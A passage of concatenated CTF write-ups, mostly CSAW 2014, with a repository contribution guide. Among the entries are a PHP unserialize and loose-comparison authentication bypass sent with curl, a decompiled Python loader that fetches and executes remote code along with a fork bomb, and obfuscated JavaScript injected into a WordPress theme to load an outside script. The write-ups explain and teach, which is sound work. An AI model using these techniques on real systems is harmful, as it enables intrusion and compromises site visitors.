Let’s try some other tricks first, though. Using `pdftotext` we can see if the flag is somehow hidden as text in the PDF:

```bash
$ pdftotext stegano50.pdf
```

This produces a file called `stegano50.txt`, which contains another teaser:

```
N

e!

er

oF
la
gH

e!
N

Close - but still not here !

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

L
```

It seems we’re on the right track.

After trying some different PDF to text converters, it turns out opening the PDF in [SumatraPDF](http://blog.kowalczyk.info/software/sumatrapdf/free-pdf-reader.html) on Windows and then saving it as a text file has different results than `pdftotext`. In that case, the output contains some more hidden text (note the `BABA […] AAABB` part):

```
NoFlagHere! NoFlagHere! NoFlagHere!
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Close - but still not here !
BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras faucibus odio ut metus vulputate, id laoreet magna
volutpat. Integer nec enim vel arcu porttitor egestas […]
```

The same text can be viewed by opening the PDF in [PDF.js](http://mozilla.github.io/pdf.js/web/viewer.html), and then inspecting the generated HTML, or logging `document.documentElement.textContent` to the developer tools console. The output for `pdftohtml stegano50.pdf` contained the text too.

Let’s take the `BABA […] AAABB` part and perform the suggested replacements using `tr`:

```bash
$ tr AB .- <<< 'BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB'
-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...--
```

An [online Morse code decoder](http://morsecode.scphillips.com/jtranslator.html) decodes this to:

```
CONGRATULATIONS,FLAG:1NV151BL3M3554G3
```

And indeed, the flag is `1NV151BL3M3554G3`.

## Other write-ups and resources

* <http://www.pwntester.com/blog/2014/04/27/dragonsector-pdf-stegano-50/>
* <http://blog.dul.ac/2014/04/DSCTF14/>
# CONFidence DS CTF Teaser: Web400

**Category:** Web
**Points:** 400
**Description:**

> Fiery Technologies has created a new login system, where all secret messages are encoded. Please, check if you can bypass the authorization and read dragon's private stuff: <http://23.253.207.102/>

## Write-up

The website says:

> **You're not logged in.**
>
> Welcome to our new security system. You can try the demo version of the script here. For sure you'll be pleased.
>
> Use below credentials to try out our unbreakable message system:
>
> « guest:guest »
>
> We'll be looking forward your order.

Logging in with username `guest` and password `guest`, we get another message:

> You're logged in as guest!
> Source code of our newest system is available here:
>
> [« demo.zip &raquo;](demo)

[Unzipping this `demo.zip` file](demo) reveals some parts of the website’s source code.

[`database.php`](demo/database.php) contains the following:

```php
<?php

$database = array(

  array(
    'username' => 'guest',
    'password' => '084e0343a0486ff05530df6c705c8bb4',
    'secret_message' =>
    'ae7d55f7e2af728e7408d50677324732bca66dbd49f7b5f02956a0cc948648c715c6e988c8a178ba0b3b7aea83911b4ba8560831af16bfc8c6aa0f30f94c4fd5013b63d44364ea6f365cf059a3c8f8a6887944152af1de6e187248595ab9956a7479890a5e6ed4e95ff7e136b54030f8c239b33d042f5811f76af989ef0bd09e2b0a5619179f9ec2790f3a89f249769a207619d3b4c8c7384d91429ed07820206fcd127dc6cb873bb19395eaa385799fda5cf3e8ff6d094a6c7a8cb385320083ce2494800b1195a727b2e0ebf3f88e9a3220600ca024d5ebdbd680b3e13c660a'
  ),

  array(
    'username' => 'dragon',
    'password' => '[put md5 of your secret password here]',
    'secret_message' =>
    '[order the full version of the script to get encryption module]'
  )

);
```

The first item checks out – `084e0343a0486ff05530df6c705c8bb4` is the MD5 hash of `guest`, the password for the `guest` account we just used to login. The second array item is missing the juicy info, but at least now we know the username of the account we’re supposed to hack in to: `dragon`.

[The `auth.php` file](demo/auth.php) determines whether a login was successful or not:

```php
$auth = $_COOKIE['auth'];
if(get_magic_quotes_gpc())
  $auth = stripslashes($auth);
$auth = unserialize($auth);

if(!is_array($auth))
  return false;

$auth['hmac_t'] = sha1(sha1($auth['username'].$auth['hmac_t'].$auth['password']).$secret_salt);

if($auth['hmac_t'] !== $auth['hmac'])
  return false;
```

As we can see, the value of the `auth` cookie gets `unserialize()`d. There is a subtle unsafe unserialization vulnerability here that allows us to bypass the `$auth['hmac_t'] === $auth['hmac'])` check: since we control the value of the `auth` cookie, we can control the value of `$auth`, [as long as it’s an array](demo/auth.php#L11-12).

The [PHP `serialize()` documentation](http://php.net/serialize) contains this nugget:

> `serialize()` handles all types, except the resource-type. You can even `serialize()` arrays that contain references to itself. Circular references inside the array/object you are serializing will also be stored. Any other reference will be lost.

In this case, we can construct a custom array with the expected `username`, `password`, and `hmac` fields, and then add a `hmac_t` field that references the `hmac` field directly. The value for the `hmac` field doesn’t even matter:

```bash
$ php -r '$a = array("username" => "dragon", "password" => "???", "hmac" => "https://github.com/ctfs/write-ups"); $a["hmac_t"] = &$a["hmac"]; echo urlencode(serialize($a)) . "\n";'
a%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22dragon%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22%3F%3F%3F%22%3Bs%3A4%3A%22hmac%22%3Bs%3A33%3A%22https%3A%2F%2Fgithub.com%2Fctfs%2Fwrite-ups%22%3Bs%3A6%3A%22hmac_t%22%3BR%3A4%3B%7D
```

Using this as the value of the `auth` cookie, we effectively bypass the `$auth['hmac_t'] === $auth['hmac'])` check. We’re still not logged in however, because of this code:

```php
$message = '';

foreach($database as $row)
{
  if($row['username'] == $auth['username'])
  if($row['password'] == $auth['password'])
  {
    $message = $row['secret_message'];
    return true;
  }
}

return false;
```

We know the expected username is `dragon`, so the `if($row['username'] == $auth['username'])` check is not a problem. We still need to make sure `$row['password'] == $auth['password']` holds true, though. `$row['password']` holds the MD5 hash of the password for the user `dragon` – a value we don’t know. How can we make our `$auth['password']` value be equal to it without knowing the right value? Luckily, [PHP’s crazy `==` operator](http://gynvael.coldwind.pl/?id=492) is being used here rather than the more sensical `===`. This allows us to use a non-string value for `$auth['password']` that will still equal any string, such as the boolean `true`. (Seriously, check out that last link link for more examples. PHP is crazy.)

```bash
$ php -r '$a = array("username" => "dragon", "password" => true, "hmac" => "https://github.com/ctfs/write-ups"); $a["hmac_t"] = &$a["hmac"]; echo urlencode(serialize($a)) . "\n";'
a%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22dragon%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3Bs%3A4%3A%22hmac%22%3Bs%3A33%3A%22https%3A%2F%2Fgithub.com%2Fctfs%2Fwrite-ups%22%3Bs%3A6%3A%22hmac_t%22%3BR%3A4%3B%7D
```

Using this as the value of the `auth` cookie, we’re successfully logged in as the `dragon` user!

```bash
$ curl --cookie 'auth=a%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22dragon%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3Bs%3A4%3A%22hmac%22%3Bs%3A33%3A%22https%3A%2F%2Fgithub.com%2Fctfs%2Fwrite-ups%22%3Bs%3A6%3A%22hmac_t%22%3BR%3A4%3B%7D' 'http://23.253.207.102/' > message.html
```

The response ([available as `message.html`](message.html)) contains the following message:

```bash
$ hexdump -C -s 0x520 message.html | head -n 23
00000520  64 69 76 20 63 6c 61 73  73 3d 22 63 6f 6e 74 61  |div class="conta|
00000530  69 6e 65 72 22 3e 0a 83  b3 6a 91 15 3e 36 d6 45  |iner">...j..>6.E|
00000540  b3 cc 5b 24 e3 49 c4 d5  f8 6a dd 64 85 7e 1b 6d  |..[$.I...j.d.~.m|
00000550  6c 04 8a eb d5 47 bd c8  05 ab d8 64 8c 37 d6 45  |l....G.....d.7.E|
00000560  7b 03 4e 09 7d f4 bd 83  b3 6a 91 15 3e 53 26 47  |{.N.}....j..>S&G|
00000570  8f 0a 8b 32 e6 36 11 d8  ff ab e5 5e 8d 85 29 2a  |...2.6.....^..)*|
00000580  6b f4 8c 40 9b 4b 02 83  f9 b9 e6 63 82 37 2a 71  |k..@.K.....c.7*q|
00000590  b0 bb 83 37 d5 3b d7 9f  c2 ba ae ff 3e 36 d6 29  |...7.;......>6.)|
000005a0  6b bb 3c eb b0 44 db 9f  f4 6a d4 61 7f 8a 29 46  |k.<..D...j.a..)F|
000005b0  6d fd 91 39 94 37 11 d1  c0 ba e3 5e 8b 78 28 82  |m..9.7.....^.x(.|
000005c0  6b fd 91 39 a1 41 04 85  b3 bc e0 61 83 53 d8 6b  |k..9.A.....a.S.k|
000005d0  c1 0f 91 3a e1 f6 bd cc  05 af d7 32 40 81 17 7f  |...:.......2@...|
000005e0  ad 0e 80 3d dd 45 11 9e  09 b9 da 59 46 87 28 78  |...=.E.....YF.(x|
000005f0  b9 0b 90 f3 9b 29 05 c8  b3 90 dd 56 85 3d e2 30  |.....).....V.=.0|
00000600  90 0d 84 39 c7 4f cf 9c  ca 7b d7 2d 54 7d 19 40  |...9.O...{.-T}.@|
00000610  ac cc 52 fc d8 09 ce 97  f8 81 d5 57 82 78 1a 3e  |..R........W.x.>|
00000620  af fd 83 2c a6 0b 1a 8a  bc 73 93 33 44 83 17 7a  |...,.....s.3D..z|
00000630  c1 0a 57 eb b8 47 04 d1  e6 c5 a3 2e 55 48 1c 41  |..W..G......UH.A|
00000640  82 01 80 02 d5 05 d3 94  f7 7f a2 29 83 4e 1a 6b  |...........).N.k|
00000650  af fc 81 00 d8 37 03 c4  c5 80 ee 15 44 89 17 7a  |.....7......D..z|
00000660  c1 0a 58 07 a3 35 db 63  93 4a 70 f5 1e 16 b6 09  |..X..5.c.Jp.....|
00000670  4b 9b 1d 07 a3 44 db 0a  20 20 20 20 20 20 3c 2f  |K....D..      </|
00000680  64 69 76 3e 0a 20 20 20  20 3c 2f 64 69 76 3e 0a  |div>.    </div>.|
```

The message is garbled because it has been decrypted using the incorrect password we provided. Looks like we’re gonna have to reverse [the `printmsg()` function in `message.php`](demo/message.php).

(TODO)

The flag is `DrgnS{2971f86fc7a161d514e7dbdad5dbfa26}`.

## Other write-ups and resources

* [Write-up by Rentjong (auto-translated)](https://translate.google.com/translate?hl=en&sl=id&tl=en&u=http%3A%2F%2Frentjong-team.blogspot.com%2F2014%2F04%2Fconfidence-dragon-sector-ctf-teaser.html)
* [Solution by phiber](https://gist.github.com/anonymous/c40c5e90482eed1151e5)
# Contribution guide

Please take a moment to review this document in order to make the contribution process easy and effective for everyone involved.

## Adding a new write-up entry

1. Each CTF gets its own folder in the root of this repository. For example, ‘Foo Bar CTF 2015’ would get a folder named `foo-bar-ctf-2015`.
2. Every CTF challenge gets its own subfolder within that folder with an appendix indicating its value. For example, all files related to the ‘Foo Bar CTF 2015’ challenge named ‘Sucky sandbox’, which is worth `150` points, would be located in `foo-bar-ctf-2015/sucky-sandbox-150`.
3. Every CTF challenge folder needs a Markdown-formatted `README.md` file, e.g. `foo-bar-ctf-2015/sucky-sandbox-150/README.md`. This file contains any details about the challenge, the main write-up itself, and links to other write-ups and resources. The folder should also contain the source files needed to reproduce the challenge.
4. Once you’re done adding the entry or making your changes, submit a pull request using the GitHub web interface.
5. Finally, make sure you follow our committing rules

## Changing an existing entry

1. Feel free to make any changes you see fit. Add a link to a write-up on your blog, add missing source files, clarify explanations in the write-up, or — if you’ve found a better way to solve a challenge — simplify the existing solution.
2. Once you’re done, submit a pull request using the GitHub web interface.

## Committing rules
These rules exist to keep the repo maintainable and complete. Please consider following them.

1. Update the root `big-ctf/README.md` file, when adding a writeup to `big-ctf/task/`. We have three different sections:
	* `Completed write-ups` - Tasks, for which there is at least one local repo writeup (see the `Write-up` section of each task)
	* `External write-ups only` - Tasks, for which there is at least one external writeup (see the `Other write-ups and resources` section of each task, but no local writeup
	* `Missing write-ups` - Tasks, for which there are no writeups available (yet).
2. If there already exists a writeup in the `Write-up` section and you want to add another local writeup:
	- Add another `Alternative write-up` section above the `Other write-ups and resources` section
3. Do not add files that have a filesize bigger than 15MB to keep the repo relatively small. Upload the file instead to a service or reference it from somewhere else.
4. Consider following these [committing rules](https://atom.io/docs/latest/contributing#git-commit-messages). For this repo, we like to use these [emojis](http://www.emoji-cheat-sheet.com/):
	* :memo: when adding a writeup to the `Write-up` section of a task
	* :floppy_disk: when adding resources for a task, e.g. files or scripts
	* :link: when adding a writeup link to the `Other write-ups and resources` section of a task
	* :pill: when fixing broken links or corrupt Markup stuff
	* :books: when updating the structure of this repo or adding a ctf skeleton structure
	* :fire: when deleting files
5. If you want to add a new CTF directory/structure (skeleton) with as little trouble as possible, then consider using the `genctf.py` tool from [our tools repo](https://github.com/ctfs/write-ups-tools/)
# CSAW CTF 2014: aerosol can

**Category:** Reverse Engineering
**Points:** 500
**Description:**

> Written by Artem
>
> Update: If the challenge says "You win!", but the scoreboard doesn't accept the key, you probably got it right but didn't find the key we were expecting. Log on to IRC, message an op (with @), and we'll do manual evaluation of the answer.
>
> [aerosol_can](aerosol_can)

## Write-up

(TODO)

## Other write-ups and resources

* <http://in3o.wordpress.com/2014/10/09/csaw-ctf-2014-reverse-500-aerosol-can/>
# CSAW CTF 2014: Big Data

**Category:** Networking
**Points:** 100
**Description:**

> Something, something, data, something, something, big
>
> Written by HockeyInJune
>
> [pcap.pcapng](pcap.pcapng)

## Write-up

Open [the provided `pcap.pcapng` file](pcap.pcapng) in Wireshark. Go to _Edit_ → _Find Packet_ → _String_ → _Search in packet bytes_, and enter `password`.

![](search.png)

This reveals an exchange over the `telnet` protocol where a server asks for a password. The next packets each contain a single character of the password, sent from the client to the server. To quickly view them all, right-click on the first packet and click _Follow TCP Stream_.

![](tcp-stream.png)

This reveals the following:

```
Linux 3.13.0-32-generic (ubuntu) (pts/0)

..ubuntu login: j.ju.ul.li.ia.an.n
.
..Password: flag{bigdataisaproblemnotasolution}
.
.
Login incorrect
..ubuntu login:
```

The flag is `bigdataisaproblemnotasolution`.

## Other write-ups and resources

* <http://evandrix.github.io/ctf/2014-csaw-networking-100-bigdata.html>
* <http://shankaraman.wordpress.com/2014/09/22/csaw-ctf-2014-networking-100-bigdata-writeup/>
* <http://bt3gl.github.io/csaw-ctf-2014-networking-100-big-data.html>
* <https://ucs.fbi.h-da.de/writeup-csaw-big-data/>
* <http://www.incertia.net/blog/csaw-ctf-quals-2014-big-data/>
# CSAW CTF 2014: bo

**Category:** Exploitation
**Points:** 100
**Description:**

> exploit this
>
> ```bash
> nc 54.165.176.104 1515
> ```
>
> Written by HockeyInJune
>
> [bo](bo)

## Write-up

[The provided `bo` file](bo) is an ELF executable:

```bash
$ file bo
bo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
```

This may not be the intended solution, but simply looking for ASCII strings in the binary reveals the flag:

```bash
$ strings bo | grep 'flag'
flag{exploitation_is_easy!}
```

Alternatively, you could open the file in [IDA](https://www.hex-rays.com/products/ida/support/download.shtml) (which is what the challenge actually suggests if you run it) and click _View_ → _Open Subviews_ → _Strings_.

The flag is `exploitation_is_easy!`.

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/09/csaw-ctf-quals-2014---bo-100pts-writeup>
* <http://evandrix.github.io/ctf/2014-csaw-exploitation-100-bo.html>
* <https://ucs.fbi.h-da.de/writeup-csaw-bo/>
* <http://www.incertia.net/blog/csaw-ctf-quals-2014-bo/>
# CSAW CTF 2014: cfbsum

**Category:** Cryptography
**Points:** 300
**Description:**

> Written by bagre
>
> [cfbsum.py](cfbsum.py)

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/anonymous/cbcf6c963ff6bc5655b3>
# CSAW CTF 2014: csaw2013reversing2.exe

**Category:** Reverse Engineering
**Points:** 200
**Description:**

> We got a little lazy so we just tweaked an old one a bit
>
> Written by HockeyInJune
>
> [csaw2013reversing2.exe](csaw2013reversing2.exe)

## Write-up

The description to the write-up hints that the challenge is just a modified version of the CSAW reversing challenge of last year.
Googling for some write-ups I found out that the previous version contained an encrypted flag which got decrypted inside a debugger trap.

Running the file gives us a dialog box with ‘Flag’ as caption and then some random bytes. So the challenge probably still has an encrypted flag which needs to be decrypted.

![](flag-encrypted.png)

Opening the file in IDA we indeed see two flows. One creates a dialog box (on the left), the other creates a debugger trap and decrypts the flag (on the right).

![](two-flows.png)

We want to patch the file so it runs the decryption and then the dialog box.

This can be done as follows:

1. Replace `jz short loc_4010B9` with `jmp short loc_401096`.
2. Replace `jmp short loc_4010EF` with `jmp short loc_4010B9`.
3. Replace the `inc ECX` and `int 3` instructions in the debugger trap with `NOP`.

After doing this we get the patched file [`csaw2013reversing2-patched.exe`](csaw2013reversing2-patched.exe).

Running this patched executable gives us a dialog box with the flag:

![](flag-decrypted.png)

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/09/csaw-ctf-quals-2014---csaw2013reversing2exe-200pts-writeup>
* <https://ucs.fbi.h-da.de/writeup-csaw-csaw2013reversing2-exe/>
* <http://naper.eu/blog/index.php?controller=post&action=view&id_post=3/>
# CSAW CTF 2014: dumpster diving

**Category:** Forensics
**Points:** 100
**Description:**

> dumpsters are cool, but cores are cooler
>
> Written by marc
>
> [firefox.mem.zip](firefox.mem.zip)

## Write-up

```bash
$ file firefox.mem.zip
firefox.mem.zip: Zip archive data, at least v2.0 to extract

$ unzip firefox.mem.zip
Archive:  firefox.mem.zip
  inflating: firefox.mem

$ file firefox.mem
firefox.mem: ELF 64-bit LSB core file x86-64, version 1 (SYSV), SVR4-style, from '/usr/lib/firefox/firefox'

$ strings firefox.mem | grep 'flag{'
ZZZZZZZZflag{cd69b4957f06cd818d7bf3d61980e291}
```

The flag is `cd69b4957f06cd818d7bf3d61980e291` (which, by the way, happens to be the MD5 hash of the string `memory`).

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/09/csaw-ctf-quals-2014---dumpster-diving-100pts-writeup>
* <https://hackucf.org/blog/csaw-2014-forensics-100-dumpster-diving/>
* <http://shankaraman.wordpress.com/2014/09/22/csaw-2014-forensics-100-dumpster-driving-writeup>
* <http://bt3gl.github.io/csaw-ctf-2014-forensics-100-dumpster-diving.html>
* <https://ucs.fbi.h-da.de/writeup-csaw-dumpster-diving/>
* <http://www.incertia.net/blog/csaw-ctf-quals-2014-dumpster-diving/>
# CSAW CTF 2014: eggshells

**Category:** Reverse Engineering
**Points:** 100
**Description:**

> I trust people on the internet all the time, do you?
>
> Written by ColdHeat
>
> [eggshells-master.zip](eggshells-master.zip)

## Write-up

Let’s unzip [the provided zip file](eggshells-master.zip):

```bash
$ unzip eggshells-master.zip
```

This creates a directory `eggshells-master` that contains a bunch of Python files. One compiled Python file, `utils.pyc`, stands out. Let’s decompile it using [`uncompyle2`](https://github.com/wibiti/uncompyle2):

```bash
$ uncompyle2 utils.pyc
# 2014.09.22 10:53:48 CEST
#Embedded file name: /Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.py
exec __import__('urllib2').urlopen('http://kchung.co/lol.py').read()
+++ okay decompyling utils.pyc
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2014.09.22 10:53:48 CEST
```

That URL looks interesting.

```bash
$ curl 'http://kchung.co/lol.py'
import os
while True:
    try:
        os.fork()
    except:
        os.system('start')
# flag{trust_is_risky}
```

The flag is `trust_is_risky`.

## Other write-ups and resources

* <http://www.mrt-prodz.com/blog/view/2014/09/csaw-ctf-quals-2014---eggshells-100pts-writeup>
* <http://bt3gl.github.io/csaw-ctf-2014-reverse-engineering-100-eggshells.html>
* <http://dhanvi1.wordpress.com/2014/10/07/csaw-ctf-quals-2014-eggshells-100-writeup/>
# CSAW CTF 2014: Feal

**Category:** Cryptography
**Points:** 300
**Description:**

> ```bash
> nc 54.85.93.193 8888
> ```
>
> Written by bagre
>
> [feal.py](feal.py)

## Write-up

(TODO)

## Other write-ups and resources

* <http://uncomputable.blogspot.com/2014/09/csaw-ctf-2014-quals-crypto-300-feal.html>
# CSAW CTF 2014: Fluffy No More

**Category:** Forensics
**Points:** 300
**Description:**

> OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious "Forgotten Freaks" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??
>
> Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of its database and configuration. Figure out what is going on!
>
> Written by brad_anton
>
> [CSAW2014-FluffyNoMore-v0.1.tar.bz2](CSAW2014-FluffyNoMore-v0.1.tar.bz2)

## Write-up

As its extension suggests, [the provided `CSAW2014-FluffyNoMore-v0.1.tar.bz2` file](CSAW2014-FluffyNoMore-v0.1.tar.bz2) is a bzip2-compressed tarball:

```bash
$ file CSAW2014-FluffyNoMore-v0.1.tar.bz2
CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block size = 900k
```

Let’s extract it:

```bash
$ tar xjfv CSAW2014-FluffyNoMore-v0.1.tar.bz2
x CSAW2014-FluffyNoMore-v0.1/
x CSAW2014-FluffyNoMore-v0.1/etc_directory.tar.bz2
x CSAW2014-FluffyNoMore-v0.1/logs.tar.bz2
x CSAW2014-FluffyNoMore-v0.1/mysql_backup.sql.bz2
x CSAW2014-FluffyNoMore-v0.1/webroot.tar.bz2
```

Oh, it contains more tarballs! Let’s extract those as well:

```bash
$ cd CSAW2014-FluffyNoMore-v0.1

$ for file in *.tar.bz2; do mkdir -p "${file}-extracted"; tar --directory "${file}-extracted" -xjf "${file}"; done
```

Viewing `logs.tar.bz2-extracted/var/log/auth.log` reveals an interesting entry:

```
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
```

Someone with root access to the server edited the web-exposed `/wp-content/themes/twentythirteen/js/html5.js` file. Reviewing the file’s contents (`webroot.tar.bz2-extracted/var/www/html/wp-content/themes/twentythirteen/js/html5.js`), it’s clear that some malicious JavaScript code was inserted.

```js
var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i<f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i<c.length;i++){if(((i==3||i==6)&&w!=2)||((i==8)&&w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("<"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'>\</"+m+"\>");
```

The above script is equivalent to the following:

```js
document.write("<script src='http://128.238.66.100/analytics.js'><\/script>");
```

Let’s download [the `analytics.js` file](analytics.js) so we can take a look at it:

```bash
$ wget http://128.238.66.100/analytics.js
```

The file consists of minified code, most of which is legitimate. A small part of it stands out because it’s obfuscated, though:

```js
var _0x91fe=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66","\x5F\x73\x65\x6C\x66","\x6F\x70\x65\x6E"];window[_0x91fe[2]](_0x91fe[0],_0x91fe[1]);
```

This [is equivalent to](https://mothereff.in/js-escapes#1var%20%5f0x91fe%3D%5B%22%5Cx68%5Cx74%5Cx74%5Cx70%5Cx3A%5Cx2F%5Cx2F%5Cx31%5Cx32%5Cx38%5Cx2E%5Cx32%5Cx33%5Cx38%5Cx2E%5Cx36%5Cx36%5Cx2E%5Cx31%5Cx30%5Cx30%5Cx2F%5Cx61%5Cx6E%5Cx6E%5Cx6F%5Cx75%5Cx6E%5Cx63%5Cx65%5Cx6D%5Cx65%5Cx6E%5Cx74%5Cx2E%5Cx70%5Cx64%5Cx66%22%2C%22%5Cx5F%5Cx73%5Cx65%5Cx6C%5Cx66%22%2C%22%5Cx6F%5Cx70%5Cx65%5Cx6E%22%5D%3Bwindow%5B%5f0x91fe%5B2%5D%5D%28%5f0x91fe%5B0%5D%2C%5f0x91fe%5B1%5D%29%3B):

```js
var _0x91fe=["http://128.238.66.100/announcement.pdf","_self","open"];
window[_0x91fe[2]](_0x91fe[0],_0x91fe[1]);
```

…which is equivalent to:

```js
window.open('http://128.238.66.100/announcement.pdf', '_self');
```

Let’s download [that `announcement.pdf` file](announcement.pdf):

```bash
$ wget http://128.238.66.100/announcement.pdf
```

Opening the PDF file in [PDF Stream Dumper](http://sandsprite.com/blogs/index.php?uid=7&pid=57) reveals some hidden JavaScript code:

![](pdf-stream-dumper.png)

```js
var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
```

This [is equivalent to](https://mothereff.in/js-escapes#1var%20%5f0xee0b%3D%5B%22%5Cx59%5Cx4F%5Cx55%5Cx20%5Cx44%5Cx49%5Cx44%5Cx20%5Cx49%5Cx54%5Cx21%5Cx20%5Cx43%5Cx4F%5Cx4E%5Cx47%5Cx52%5Cx41%5Cx54%5Cx53%5Cx21%5Cx20%5Cx66%5Cx77%5Cx69%5Cx77%5Cx2C%5Cx20%5Cx6A%5Cx61%5Cx76%5Cx61%5Cx73%5Cx63%5Cx72%5Cx69%5Cx70%5Cx74%5Cx20%5Cx6F%5Cx62%5Cx66%5Cx75%5Cx73%5Cx63%5Cx61%5Cx74%5Cx69%5Cx6F%5Cx6E%5Cx20%5Cx69%5Cx73%5Cx20%5Cx73%5Cx6F%5Cx66%5Cx61%5Cx20%5Cx6B%5Cx69%5Cx6E%5Cx67%5Cx20%5Cx64%5Cx75%5Cx6D%5Cx62%5Cx20%5Cx20%5Cx3A%5Cx29%5Cx20%5Cx6B%5Cx65%5Cx79%5Cx7B%5Cx54%5Cx68%5Cx6F%5Cx73%5Cx65%5Cx20%5Cx46%5Cx6C%5Cx75%5Cx66%5Cx66%5Cx79%5Cx20%5Cx42%5Cx75%5Cx6E%5Cx6E%5Cx69%5Cx65%5Cx73%5Cx20%5Cx4D%5Cx61%5Cx6B%5Cx65%5Cx20%5Cx54%5Cx75%5Cx6D%5Cx6D%5Cx79%5Cx20%5Cx42%5Cx75%5Cx6D%5Cx70%5Cx79%5Cx7D%22%5D%3Bvar%20y%3D%5f0xee0b%5B0%5D%3B):

```js
var _0xee0b=["YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}"];
var y=_0xee0b[0];
```

The flag is `Those Fluffy Bunnies Make Tummy Bumpy`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/09/csaw14-fluffy-no-more-writeup.html>
* <http://sugarstack.io/csaw-2014-fluffy-no-more.html>
* <https://hackucf.org/blog/csaw-2014-forensics-300-fluffy-no-more/>
* <http://bt3gl.github.io/csaw-ctf-2014-forensics-300-fluffy-no-more.html>
* <http://blog.squareroots.de/en/2014/09/csaw14-fluffy-no-more/>
# CSAW CTF 2014: Fuzyll

**Category:** Recon
**Points:** 100
**Description:**

> Unbeknownst to many, Fuzyll is actually the next Dendi. Like most of Reddit, he just needs better teammates first. He's not ranked yet, but his MMR would definitely be at least 10000. I mean, have you seen him play?
>
> Written by fuzyll

## Write-up

One possible solution is:

1. Go to [dotabuff.com](http://www.dotabuff.com/).
2. Search for ‘fuzyll’ and click ‘matches’ which takes you to <http://www.dotabuff.com/players/80484382/matches>.
3. Click the seventh match (at the time of CSAW CTF) where it says “Won Match”.
4. The URL is <http://www.dotabuff.com/matches/903461176>, so the match ID is `903461176`.
5. Go to [dotabank.com](http://dotabank.com/)
6. Enter the match ID `903461176`, which takes you to <http://dotabank.com/replays/903461176/>.
7. Get the replay and get the flag.

## Other write-ups and resources

* <http://www.incertia.net/blog/csaw-ctf-quals-2014-fuzyll/>
# CSAW CTF 2014: geohot pls

**Category:** Trivia
**Points:** 10
**Description:**

> This is what geohot and other members of the CTF community are calling live streamed CTF competitions where spectators can watch competitors screens as they solve challenges.

## Write-up

The answer is `livectf`.

## Other write-ups and resources

* none yet
# CSAW CTF 2014: greenhornd

**Category:** Exploitation
**Points:** 400
**Description:**

> ```bash
> nc 54.164.253.42 9998
> ```
>
